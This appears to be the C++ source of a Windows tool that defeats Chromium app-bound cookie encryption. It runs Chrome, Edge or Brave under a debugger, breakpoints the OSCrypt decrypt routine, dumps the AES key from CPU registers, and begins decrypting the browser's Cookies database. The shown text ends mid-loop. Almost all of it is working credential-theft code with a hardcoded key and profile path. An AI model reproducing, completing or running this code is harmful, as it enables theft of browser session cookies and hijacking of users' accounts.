#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <stdio.h>
#include <cstdint>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sqlite3.h>
#include <cryptopp/aes.h>
#include <cryptopp/gcm.h>
#include <cryptopp/filters.h>
#include <json/json.h>
#include <iomanip>   // for std::hex, std::setw
#include <sstream>
#include <memory>
#include <algorithm>


#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "shlwapi.lib")

#pragma region HWBreakpoint

typedef NTSTATUS(NTAPI* NtGetNextThread)(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle);
#define STATUS_NO_MORE_ENTRIES           ((NTSTATUS)0x8000001AL)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
using namespace CryptoPP;
using namespace std;
vector<byte> hexToBytes(const string& hex) {
    vector<byte> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        string byteString = hex.substr(i, 2);
        byte b = (byte)strtol(byteString.c_str(), nullptr, 16);
        bytes.push_back(b);
    }
    return bytes;
}

// Convert raw data to hex string (safe JSON storage)
string toHex(const string& input) {
    ostringstream oss;
    for (unsigned char c : input) {
        oss << hex << setw(2) << setfill('0') << (int)c;
    }
    return oss.str();
}

// Check if all chars are printable ASCII
bool isPrintable(const string& s) {
    return all_of(s.begin(), s.end(), [](unsigned char c) {
        return (c >= 0x20 && c <= 0x7E);
        });
}
std::string actual_key;  // global key string
string key_hex = "228B59EF52C1F00560C59F370DC88E19E3CE4D23308A3B56C96F3983E0469069";
vector<byte> key = hexToBytes(key_hex);
string db_path = "C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
BOOL SetHWBreakPoint(HANDLE hThread, DWORD64 addr)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] Failed to acquire Thread Context. Error: %d\n", GetLastError());
        return false;
    }

    // Set break point to Debug Register #0
    ctx.Dr0 = addr;

    //Clear before resetting
    ctx.Dr7 = 0;

    // Enable slot #0
    ctx.Dr7 |= (1ull << 0);

    // Clear status
    ctx.Dr6 = 0;

    return SetThreadContext(hThread, &ctx);
}

BOOL SetHWBPOnThread(HANDLE hThread, uintptr_t bpAddress) {

    if (SuspendThread(hThread) == ((DWORD)-1)) {
        printf("[-] Failed to suspend Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
        return FALSE;
    }

    if (!SetHWBreakPoint(hThread, bpAddress)) //Continue on error
        printf("[-] Failed to set HW breakpoint on Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());

    if (ResumeThread(hThread) == ((DWORD)-1)) {
        printf("[-] Failed to resume Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL SetOnAllThreads(HANDLE hProcess, uintptr_t bpAddr) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
    {
        printf("[-] Failed to get module handle for NTDLL.dll, Error: %d\n", GetLastError());
        return FALSE;
    }
    NtGetNextThread pNtGetNextThread = reinterpret_cast<NtGetNextThread>(GetProcAddress(ntdll, "NtGetNextThread"));
    if (!pNtGetNextThread) {
        printf("[-] Could not find function address for NtGetNextThread\n");
        return FALSE;
    }

    HANDLE hThread = nullptr;
    for (;;) {
        HANDLE hNextThread = nullptr;
        NTSTATUS st = pNtGetNextThread(hProcess, hThread, THREAD_ALL_ACCESS, 0, 0, &hNextThread);
        if (!NT_SUCCESS(st)) {

            if (hThread)
                CloseHandle(hThread);

            if (st != STATUS_NO_MORE_ENTRIES) {
                printf("[-] NtGetNextThread failed with error: %d\n", GetLastError());
                return FALSE;
            }
            return TRUE;
        }

        if (SetHWBPOnThread(hNextThread, bpAddr)) {
#ifdef _DEBUG
            printf("[*] HW breakpoint set on Thread: %d\n", GetThreadId(hNextThread));
#endif // _DEBUG

        }

        //Close old handle
        if (hThread)
            CloseHandle(hThread);

        hThread = hNextThread;
    }

    if (hThread)
        CloseHandle(hThread);

    return TRUE;
}

BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr) {

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
        return FALSE;
    }

    THREADENTRY32 te = { sizeof(THREADENTRY32) };
    if (!Thread32First(snap, &te))
    {
        printf("[-] Thread32First failed, Error: %d\n", GetLastError());
        return FALSE;
    }

    do {
        if (te.th32OwnerProcessID != pid)
            continue;

        HANDLE th = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
        if (!th) {
            printf("[-] Failed to open Thread: %d, Error: %d\n", te.th32ThreadID, GetLastError());
            return FALSE;
        }

        //We already notify on errors elsewhere, just have debug output here
        if (SetHWBPOnThread(th, addr))
            printf("[*] HW breakpoint set on Thread: %d\n", te.th32ThreadID);

        CloseHandle(th);
    } while (Thread32Next(snap, &te));

    CloseHandle(snap);
    return TRUE;
}

#pragma endregion

BOOL FindAndTerminateProcess(wchar_t* processName) {

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        printf("[-] Process32First failed, Error: %d\n", GetLastError());
        CloseHandle(hProcessSnap);
        return FALSE;
    }

    do
    {
        if (_wcsicmp(pe32.szExeFile, processName) == 0)
        {
            HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);

            if (!TerminateProcess(hParent, 0)) {
#ifdef _DEBUG
                //This is expected as ususally the parent process gets terminated first and the rest no longer exist, causing Error: 5.
                printf("[-] Failed to kill process: %d, Error: %d\n", pe32.th32ParentProcessID, GetLastError());
#endif
            }
            else
                wprintf(L"[+] Terminated existing %s process pid: %d, Error: %d\n", processName, pe32.th32ParentProcessID, GetLastError());

            CloseHandle(hParent);
        }

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return TRUE;
}

BOOL FindSectionHeader(HANDLE hProcess, uintptr_t moduleBase, const char* targetSection, IMAGE_SECTION_HEADER* section) {
    IMAGE_DOS_HEADER dos = { 0 };
    IMAGE_NT_HEADERS64 nt = { 0 };

    size_t read = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)moduleBase, &dos, sizeof(IMAGE_DOS_HEADER), &read)) {
        printf("[-] Failed to read DLL DOS header. Error: %d\n", GetLastError());
        return FALSE;
    }
    read = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)(moduleBase + dos.e_lfanew), &nt, sizeof(IMAGE_NT_HEADERS64), &read)) {
        printf("[-] Failed to read DLL NT header. Error: %d\n", GetLastError());
        return FALSE;
    }
    read = 0;

    for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        int offset = (dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64)) + (i * sizeof(IMAGE_SECTION_HEADER));

        IMAGE_SECTION_HEADER sectionHeader = { 0 };
        if (!ReadProcessMemory(hProcess, (LPCVOID)(moduleBase + offset), &sectionHeader, sizeof(IMAGE_SECTION_HEADER), &read)) {
            printf("[-] Failed to read Section header: %d. Error: %d\n", i, GetLastError());
            continue; //Too bad, continue to the next
        }
        else {
            //We are only interested in short section names, so this is fine
            char name[9] = { 0 };
            memcpy(name, sectionHeader.Name, 8);

            if (_stricmp(name, targetSection) == 0) {

                uintptr_t sectionBase = moduleBase + sectionHeader.VirtualAddress;
                DWORD sectionSize = sectionHeader.Misc.VirtualSize ? sectionHeader.Misc.VirtualSize : sectionHeader.SizeOfRawData;

                memcpy_s(section, sizeof(IMAGE_SECTION_HEADER), &sectionHeader, sizeof(IMAGE_SECTION_HEADER));

                printf("[*] Found target secion: %s, Base address: 0x%016llx, Size: %d\n", name, sectionBase, sectionSize);
                return TRUE;
            }
        }
        read = 0;
    }

    return FALSE;
}

uintptr_t FindXREF(HANDLE hProcess, uintptr_t moduleBaseAddr, uintptr_t targetAddress) {

    IMAGE_SECTION_HEADER sectionHeader = { 0 };
    if (!FindSectionHeader(hProcess, moduleBaseAddr, ".text", &sectionHeader)) {
        printf("[-] Failed to get .text section header.\n");
        return 0;
    }

    uintptr_t sectionBase = moduleBaseAddr + sectionHeader.VirtualAddress;
    DWORD sectionSize = sectionHeader.Misc.VirtualSize ? sectionHeader.Misc.VirtualSize : sectionHeader.SizeOfRawData;

    BYTE* buffer = new BYTE[sectionSize];
    SIZE_T bytesRead;

    //Might be smarter to read the memory in blocks rather than try to take it all, but well... 
    if (ReadProcessMemory(hProcess, (LPCVOID)sectionBase, buffer, sectionSize, &bytesRead)) {

        /*
        * Scanning for our XREF, this one requires bit of explaining..
        * In Ghidra the bytes are: 48 8D 0D 3F 9B FC 05
        * Which matches instruction:
        *   LEA  RCX,[s_OSCrypt.AppBoundProvider.Decrypt_18db0d]
        *
        * Byte by byte explanation is:
        * 48 = REX.W
        * 8D = LEA
        * 0D = ModRM(Mod = 00, Reg = 001 -> RCX, R / M = 101 -> RIP - rel)
        * 3F 9B FC 05 = disp32 = 0x05FC9B3F
        *
        * And to come up for the value 0x05FC9B3F,
        * we will need to calculate it during our scan, as it is relative
        */

        size_t instrLen = 7; // rex + opcode + modrm + disp32
        for (size_t i = 0; i + instrLen <= bytesRead;) {
            size_t p = i;

            // REX.W
            if (buffer[p++] != 0x48) {
                i++; continue;
            }
            // LEA
            if (buffer[p++] != 0x8D) {
                i++; continue;
            }
            // ModRM
            if (buffer[p++] != 0x0D) {
                i++; continue;
            }

            int32_t disp;
            memcpy(&disp, buffer + p, 4);
            p += 4;

            uint64_t instrVA = (uint64_t)sectionBase + i;
            uint64_t target = instrVA + instrLen + (int64_t)disp;

            if (target == targetAddress) {
                uintptr_t address = (sectionBase + i);
                printf("[+] Found target XREF at: 0x%016llx, Section: 0x%016llx, Offset:  0x%Ix\n", address, sectionBase, i);
                delete[] buffer;
                return address;
            }
            i++;
        }
    }
    else {
        printf("[-] ReadProcessMemory failed to read the section 0x%016llx Error: %lu\n", sectionBase, GetLastError());
    }

    printf("[-] Failed to find the pattern in 0x%016llx section.\n", sectionBase);
    delete[] buffer;
    return 0;
}

uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, size_t patternLen) {

    IMAGE_SECTION_HEADER sectionHeader = { 0 };
    if (!FindSectionHeader(hProcess, moduleBaseAddr, ".rdata", &sectionHeader)) {
        printf("[-] Failed to get .rdata section header.\n");
        return 0;
    }

    uintptr_t sectionBase = moduleBaseAddr + sectionHeader.VirtualAddress;
    DWORD sectionSize = sectionHeader.Misc.VirtualSize ? sectionHeader.Misc.VirtualSize : sectionHeader.SizeOfRawData;

    BYTE* buffer = new BYTE[sectionSize];
    SIZE_T bytesRead;
    //Might be smarter to read the memory in blocks rather than try to take it all, but well... 
    if (ReadProcessMemory(hProcess, (LPCVOID)sectionBase, buffer, sectionSize, &bytesRead)) {
        for (size_t i = 0; i <= bytesRead - patternLen; ++i) {
            if (memcmp(buffer + i, pattern, patternLen) == 0) {
                uintptr_t resultAddress = sectionBase + i;
                printf("[*] Found pattern on Address: 0x%016llx, Section base: 0x%016llx, Offset: 0x%Ix\n", resultAddress, sectionBase, i);
                delete[] buffer;
                return resultAddress;
            }
        }
    }
    else {
        printf("[-] ReadProcessMemory failed to read the section 0x%016llx Error: %lu\n", sectionBase, GetLastError());
    }

    printf("[-] Failed to find the pattern in 0x%016llx section.\n", sectionBase);
    delete[] buffer;
    return 0;
}

void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
    SIZE_T n = 0;
    uintptr_t address = 0;
    if (!ReadProcessMemory(hProc, (LPCVOID)registryAddr, &address, sizeof(uintptr_t), &n)) {
        printf("[-] Failed to read contents of R14, Error: %lu\n", GetLastError());
        return;
    }
    printf("[*] Encryption key will be at 0x%016llx\n", (unsigned long long)address);

    n = 0;
    const int keyLen = 32;
    BYTE key[keyLen] = { 0 };
    if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
        printf("[-] Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
        return;
    }

    printf("[+] your key: ");
    actual_key.clear();
    for (size_t i = 0; i < keyLen; i++) {
        char tmp[3];
        sprintf_s(tmp, "%02X", key[i]);   // make 2 hex chars
        actual_key += tmp;             // append to global string
        printf("%02X", key[i]);         // print to console
    }
    
    std::cout << actual_key << std::endl;
}

void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;

    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %d\n", GetLastError());
        CloseHandle(hThread);
        return;
    }
#ifdef _DEBUG
    printf("[*] Registry contents:\n");
    printf("    RAX=%llx RBX=%llx RCX=%llx RDX=%llx\n", ctx.Rax, ctx.Rbx, ctx.Rcx, ctx.Rdx);
    printf("    RSI=%llx RDI=%llx RBP=%llx RSP=%llx\n", ctx.Rsi, ctx.Rdi, ctx.Rbp, ctx.Rsp);
    printf("    R8 =%llx R9 =%llx R10=%llx R11=%llx\n", ctx.R8, ctx.R9, ctx.R10, ctx.R11);
    printf("    R12=%llx R13=%llx R14=%llx R15=%llx\n", ctx.R12, ctx.R13, ctx.R14, ctx.R15);
    printf("    RIP=%llx EFLAGS=%08lx\n", ctx.Rip, ctx.EFlags);
#endif // _DEBUG

    if (ctx.R14 == 0)
    {
        printf("[-] R14 registry was empty\n");
        return;
    }

    if (edge && ctx.Rbx == 0)
    {
        printf("[-] RBX registry was empty\n");
        return;
    }

    if (edge)
    {
        printf("[*] Dumping key from RBX\n");
        PrintKey(hProc, ctx.Rbx);
    }
    else {
        printf("[*] Dumping key from R14\n");
        PrintKey(hProc, ctx.R14);
    }
}

BOOL GetModuleName(HANDLE hProcess, const void* remote, wchar_t* dllName) {

    SIZE_T read = 0;
    wchar_t bufferW[1024] = { 0 };
    if (!ReadProcessMemory(hProcess, remote, bufferW, sizeof(bufferW) - sizeof(wchar_t), &read)) {
        int lastError = GetLastError();
        if (lastError != 299) { //NTDLL etc will cause this error, but we don't care about that
            printf("[-] GetModuleName: ReadProcessMemory failed to read the unicode string. Error: %d\n", lastError);
            return FALSE;
        }
    }
    bufferW[read / sizeof(wchar_t)] = L'\0';

    const wchar_t* executableName = PathFindFileNameW(bufferW);
    wcscpy_s(dllName, MAX_PATH, executableName);

    return TRUE;
}

BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress) {

    BYTE breakpointByte = 0xCC; // INT 3
    if (WriteProcessMemory(hProcess, (LPVOID)breakpointAddress, &breakpointByte, sizeof(BYTE), nullptr)) {
        printf("[*] Breakpoint set successfully at address: 0x%016llx\n", breakpointAddress);
    }
    else {
        printf("[-] Failed to set breakpoint at address: 0x%016llx, Error: %d\n", breakpointAddress, GetLastError());
        return FALSE;
    }

    return TRUE;
}

void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, DWORD waitTime, BOOL useHW, BOOL useTL32) {
    DEBUG_EVENT debugEvent;
    uintptr_t breakpointAddress = 0x00;

    if (waitTime == 0)
        waitTime = INFINITE;

    while (WaitForDebugEvent(&debugEvent, waitTime)) {
        switch (debugEvent.dwDebugEventCode) {
        case EXCEPTION_DEBUG_EVENT: {
            EXCEPTION_RECORD exceptionRecord = debugEvent.u.Exception.ExceptionRecord;

            // Uncomment this and you will know why it is commented out even on debug builds
            //printf("[*] Exception occurred at address: 0x%llx", exceptionRecord.ExceptionAddress);

            if (useHW && breakpointAddress != 0)
            {
                if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
                    debugEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {

                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                    if (!hThread) {
                        printf("[-] Failed to open Thread: %d, Error: %d\n", debugEvent.dwThreadId, GetLastError());

                        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                        return;
                    }

                    CONTEXT c = { 0 };
                    c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

                    GetThreadContext(hThread, &c);

                    printf("[+] Hit HW breakpoint Execute at slot 0: RIP=0x%016llx\n", (unsigned long long)c.Rip);

                    if (_wcsicmp(targetModule, L"msedge.dll") == 0)
                        DumpSecret(hProcess, hThread, TRUE);
                    else
                        DumpSecret(hProcess, hThread, FALSE);

                    CloseHandle(hThread);

                    ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                    return;
                }
            }
            else {
                // Check if the hit breakpoint is the one we set
                if (!useHW && exceptionRecord.ExceptionAddress == (LPCVOID)breakpointAddress) {
                    printf("[+] Thread: %d hit the breakpoint at: 0x%p\n", debugEvent.dwThreadId, exceptionRecord.ExceptionAddress);

                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                    if (hThread) {
                        DWORD exitCode;
                        if (GetExitCodeThread(hThread, &exitCode)) {
                            if (exitCode == STILL_ACTIVE) {
                                if (_wcsicmp(targetModule, L"msedge.dll") == 0)
                                    DumpSecret(hProcess, hThread, TRUE);
                                else
                                    DumpSecret(hProcess, hThread, FALSE);
                            }
                            else
                                printf("[-] Thread %d has already exited. Exit code: %d\n", debugEvent.dwThreadId, exitCode);
                        }
                        else
                            printf("[-] Failed to get Thread %d exit code. Error: %d\n", debugEvent.dwThreadId, GetLastError());

                        CloseHandle(hThread);
                    }
                    else {
                        printf("[-] Failed to open Thread: %d. Error: %d\n", debugEvent.dwThreadId, GetLastError());
                    }

                    return;
                }
            }
            break;
        }
        case CREATE_THREAD_DEBUG_EVENT:
            if (useHW && breakpointAddress != 0) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                if (!hThread) {
                    printf("[-] Failed to open Thread: %d, Error: %d\n", debugEvent.dwThreadId, GetLastError());
                    break;
                }
                if (SetHWBPOnThread(hThread, breakpointAddress)) {
#ifdef _DEBUG
                    printf("[*] HW breakpoint set on new Thread: %d\n", debugEvent.dwThreadId);
#endif // _DEBUG

                }

                CloseHandle(hThread);
            }
            break;
        case CREATE_PROCESS_DEBUG_EVENT:
            break;
        case EXIT_THREAD_DEBUG_EVENT:
            break;
        case EXIT_PROCESS_DEBUG_EVENT:
            printf("[+] EXIT_PROCESS_DEBUG_EVENT\n");
            printf("[+] Process exited. Exiting debug loop.\n");
            return; // Exit the loop and end debugging
        case LOAD_DLL_DEBUG_EVENT: {

            //already set the breakpoint
            if (breakpointAddress != 0)
                break;

            // Identify chrome.dll when it loads
            if (debugEvent.u.LoadDll.lpImageName) {
                PVOID namePtrInTarget = debugEvent.u.LoadDll.lpImageName;

                PVOID strPtr = nullptr;
                SIZE_T rb = 0;
                if (!ReadProcessMemory(hProcess, namePtrInTarget, &strPtr, sizeof(strPtr), &rb) && strPtr) {
                    printf("[-] Failed to read DLL name from address: 0x%p. Error: %d\n", namePtrInTarget, GetLastError());
                }
                wchar_t DllName[MAX_PATH];
                if (!GetModuleName(hProcess, strPtr, DllName)) {
                    printf("[-] Failed to parse DLL name from the remote process.\n");
                    break;
                }

                if (_wcsicmp(targetModule, DllName) == 0)
                {
                    LPVOID chromeDllBase = debugEvent.u.LoadDll.lpBaseOfDll;

                    wprintf(L"[*] %s loaded at 0x%p\n", targetModule, chromeDllBase);

                    //OSCrypt.AppBoundProvider.Decrypt.ResultCode
                    BYTE stringPattern[] = {
                        0x4f,0x53,0x43,0x72,0x79,0x70,0x74,0x2e,0x41,0x70,0x70,0x42,0x6f,0x75,0x6e,0x64,
                        0x50,0x72,0x6f,0x76,0x69,0x64,0x65,0x72,0x2e,0x44,0x65,0x63,0x72,0x79,0x70,0x74,
                        0x2e,0x52,0x65,0x73,0x75,0x6c,0x74,0x43,0x6f,0x64,0x65,0x00
                    };
                    size_t szStringPattern = 44;

                    uintptr_t result = FindPattern(hProcess, reinterpret_cast<uintptr_t>(chromeDllBase), stringPattern, szStringPattern);
                    if (result == 0)
                    {
                        printf("[-] Failed to find the first pattern.\n");
                        return;
                    }

                    printf("[+] Found first pattern on address: 0x%016llx\n", result);

                    breakpointAddress = FindXREF(hProcess, reinterpret_cast<uintptr_t>(chromeDllBase), result);
                    if (breakpointAddress == 0)
                    {
                        printf("[-] Failed to find the second pattern.\n");
                        return;
                    }

                    printf("[+] Found second pattern on address: 0x%016llx\n", breakpointAddress);

                    if (useHW)
                    {
                        if (useTL32)
                        {
                            if (!SetOnAllThreadsTL32(debugEvent.dwProcessId, breakpointAddress)) {
                                printf("[-] Failed to set HW breakpoints!\n");
                                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                                return;
                            }
                        }
                        else {
                            if (!SetOnAllThreads(hProcess, breakpointAddress)) {
                                printf("[-] Failed to set HW breakpoints!\n");
                                return;
                            }
                        }
                    }
                    else {
                        if (!SetBreakPoint(hProcess, breakpointAddress)) {
                            printf("[-] Failed to set the breakpoint.\n");
                            return;
                        }
                    }
                }
            }
        }
                                 break;
        case UNLOAD_DLL_DEBUG_EVENT:
            break;
        case OUTPUT_DEBUG_STRING_EVENT:
            break;
        case RIP_EVENT:
            break;
        default:
            break;
        }
        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
    }
}

void usage() {
    printf("Help!\n\n");
    printf("Examples:\n");
    printf(".\\Example.exe /chrome\n");
    printf("    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n");
    printf("    Waits for 500 milliseconds for process to finish until forced shutdown.\n");
    printf(".\\Example.exe /chrome /hw\n");
    printf("    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n");
    printf("    Will use Hardware breakpoints instead of the software ones\n");
    printf("    Waits for 500 milliseconds for process to finish until forced shutdown.\n");
    printf(".\\Example.exe /edge /wait:1000\n");
    printf("    Starts a new chrome process using path: C:\\Program Files(x86)\\Microsoft\\Edge\\Application\\msedge.exe\n");
    printf("    Waits for 1000 milliseconds for process to finish until forced shutdown.\n");
    printf(".\\Example.exe /path:\"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe\" /module:chrome.dll\n");
    printf("    Targets the Brave browser\n");
    printf("Flags:\n");
    printf("    /chrome                Target Chrome process.\n");
    printf("    /edge                  Target Edge process.\n");
    printf("    /hw                    Use Hardware breakpoints instead of SW ones.\n");
    printf("    /tl32                  Use CreateToolhelp32Snapshot to enumerate process threads when using with /HW flag\n");
    printf("    /wait:<milliseconds>   Maximum time to for the debugging. Use 0 for INFINITE. Defaults to 500ms.\n");
    printf("    /path:<path_to_exe>    Provide path to the process executable\n");
    printf("    /module:<some.dll>     Provide alternative module to target\n");
    printf("    /help                  This what you just did! -h works as well\n");
}

void banner() {
    printf(" _     _     _           _               _   _       _     _           \n");
    printf("| |   (_)   | |         | |             | | | |     | |   (_)          \n");
    printf("| |__  _  __| | ___ _ __| |__   ___  ___| |_| | ___ | |__  _  ___  ___ \n");
    printf("| '_ \\| |/ _` |/ _ \\ '__| '_ \\ / _ \\/ __| __| |/ _ \\| '_ \\| |/ _ \\/ __|\n");
    printf("| | | | | (_| |  __/ |  | | | |  __/\\__ \\ |_| | (_) | | | | |  __/\\__ \\\n");
    printf("|_| |_|_|\\__,_|\\___|_|  |_| |_|\\___||___/\\__|_|\\___/|_| |_|_|\\___||___/\n");
    printf("By hidden9090                                          github.com/hidden9090\n");
}


int main(int argc, char* argv[]) {

    BOOL useHW = FALSE;
    BOOL useTL32 = FALSE;
    BOOL terminate = FALSE;
    DWORD wait = 500; //Default wait time 500ms

    const wchar_t* targetModule = L"";
    const wchar_t* targetExecutable = L"";
    wchar_t path[MAX_PATH] = { 0 };
    wchar_t module[MAX_PATH] = { 0 };

    //Jump over the program name
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "HW") != NULL)
            useHW = TRUE;
        if (StrStrIA(argv[i], "tl32") != NULL)
            useTL32 = TRUE;
        if (StrStrIA(argv[i], "terminate") != NULL)
            terminate = TRUE;

        if (StrStrIA(argv[i], "edge") != NULL) {
            targetModule = L"msedge.dll";
            targetExecutable = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
        }
        if (StrStrIA(argv[i], "chrome") != NULL) {
            targetModule = L"chrome.dll";
            targetExecutable = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
        }
        if (StrStrIA(argv[i], "wait:") != NULL)
        {
            //Split and take wait time
            const char* colonPos = strchr(argv[i], ':');
            size_t waitLen = strlen(colonPos + 1);
            char* remainder = new char[waitLen + 1];
            strcpy_s(remainder, waitLen + 1, colonPos + 1);
            if (sscanf_s(remainder, "%lu", &wait) == 0) {
                printf("[-] Failed to parse command line argument /wait!\n");
                return 1;
            }
        }
        if (StrStrIA(argv[i], "path:") != NULL) {
            const char* colonPos = strchr(argv[i], ':');
            size_t pathLen = strlen(colonPos + 1) + sizeof(wchar_t);
            if (errno_t  err = mbstowcs_s(NULL, path, pathLen, colonPos + 1, MAX_PATH) != 0) {
                printf("[-] Failed to parse command line argument /path, Error: %d\n", err);
                return 1;
            }
        }
        if (StrStrIA(argv[i], "module:") != NULL) {
            const char* colonPos = strchr(argv[i], ':');
            size_t moduleLen = strlen(colonPos + 1) + sizeof(wchar_t);
            if (errno_t err = mbstowcs_s(NULL, module, moduleLen, colonPos + 1, MAX_PATH) != 0) {
                printf("[-] Failed to parse command line argument /module, Error: %d\n", err);
                return 1;
            }
        }
        if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
            banner();
            usage();
            return 0;
        }
    }

    //This is important
    banner();
    printf("How am I supposed to use the key though?\n\n");

    //Use provided path if one was given
    if (wcslen(path) > 0)
        targetExecutable = reinterpret_cast<const wchar_t*>(path);

    //Use provided module if one was given
    if (wcslen(module) > 0)
        targetModule = reinterpret_cast<const wchar_t*>(module);

    if (targetModule == L"" || targetExecutable == L"")
    {
        printf("[-] Flags /Edge, /Chrome or /Path and /Module are reqruired\n");
        usage();
        return 0;
    }

    if (terminate)
    {
        wchar_t* executableName = PathFindFileNameW(targetExecutable);
        FindAndTerminateProcess(executableName);
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start a new instance suspended
    if (!CreateProcess(targetExecutable, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        printf("Failed to create process. Error: %d\n", GetLastError());
        return 1;
    }

    // Resume the thread to start execution
    DWORD resumeResult = ResumeThread(pi.hThread);
    if (resumeResult == (DWORD)-1) {
        printf("[-] Failed to resume thread. Error: %d\n", GetLastError());
        return 1;
    }
    else {
        printf("[+] Thread resumed successfully.\n");

        // Attach the debugger to the new process
        if (DebugActiveProcess(pi.dwProcessId)) {

            printf("[+] Debugger attached to process with PID: %d\n", pi.dwProcessId);
            DebugProcess(pi.hProcess, pi.hThread, targetModule, wait, useHW, useTL32);
        }
        else {
            printf("[-] DebugActiveProcess failed to attach. Error: %d\n", GetLastError());
            return 1;
        }
    }

    // Clean up
    printf("[+] Terminating the spawned process\n");

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("[+] Done\n");
    // Hex string -> bytes
    

    
        
        sqlite3* db;
        if (sqlite3_open(db_path.c_str(), &db) != SQLITE_OK) {
            cerr << "Cannot open DB: " << sqlite3_errmsg(db) << "\n";
            return 1;
        }

        sqlite3_stmt* stmt;
        string sql = "SELECT name, host_key, encrypted_value, expires_utc, is_httponly, path, samesite, is_secure FROM cookies";
        if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << "\n";
            sqlite3_close(db);
            return 1;
        }

        Json::Value cookies(Json::arrayValue);
        int count = 0;

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* name_blob = sqlite3_column_blob(stmt, 0);
            int name_len = sqlite3_column_bytes(stmt, 0);
            string name((const char*)name_blob, name_len);

            const void* host_blob = sqlite3_column_blob(stmt, 1);
            int host_len = sqlite3_column_bytes(stmt, 1);
            string host_key((const char*)host_blob, host_len);

            const void* enc_val_blob = sqlite3_column_blob(stmt, 2);
            int enc_val_len = sqlite3_column_bytes(stmt, 2);

            long long expires_utc = sqlite3_column_int64(stmt, 3);
            int is_httponly = sqlite3_column_int(stmt, 4);

            const void* path_blob = sqlite3_column_blob(stmt, 5);
            int path_len = sqlite3_column_bytes(stmt, 5);
            string path((const char*)path_blob, path_len);

            int samesite = sqlite3_column_int(stmt, 6);
            int is_secure = sqlite3_column_int(stmt, 7);

            if (enc_val_len <= (3 + 12 + 16)) {
                continue;
            }

            const byte* data = static_cast<const byte*>(enc_val_blob);
